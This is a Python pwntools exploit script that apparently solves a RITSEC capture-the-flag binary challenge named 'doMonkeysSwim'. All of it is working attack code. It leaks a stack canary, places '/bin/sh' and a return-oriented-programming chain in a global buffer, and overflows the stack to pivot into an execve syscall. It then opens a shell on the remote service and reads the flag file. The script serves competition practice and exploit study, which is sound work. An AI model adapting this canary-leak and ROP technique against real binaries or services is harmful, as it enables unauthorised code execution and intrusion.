#!/usr/bin/env python3
from pwn import *

HOST = "dms.ctf.ritsec.club"
PORT = 1400
exe = context.binary = ELF('./doMonkeysSwim_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x0000000000401CCC
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

# Leak canary

p.sendlineafter(b">> ", b'3\n11')
p.recvuntil(b"That monkey holds this: ")
canary = int(p.recvline()[:-1], 16)
log.info("canary: " + hex(canary))

# Get shell

pop_rax = 0x00401f49
pop_rdi = 0x00401f43
pop_rsi = 0x00401f45
pop_rdx = 0x00401f47
syscall = 0x00401349
bed = 0x4cca60

rop = flat(
    b"/bin/sh\0",
    b"A"*8,
    canary,
    0,
    pop_rdi, bed,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 0x3b,
    syscall
    )
rop = rop.ljust(104, b'\0')

p.sendlineafter(b">> ", b'5')
p.sendlineafter(b"Swap this: ", rop)
p.sendlineafter(b"With this: ", b'x')

pl = flat(
    b"A"*0x18,
    canary,
    bed + 8 + 8 + 8
    )
pl.ljust(39, b'\0')[:-1]

p.sendlineafter(b">> ", b"4\n" + pl)
p.sendlineafter(b">> ", b'6')
p.sendline("cat flag.txt")
p.interactive()
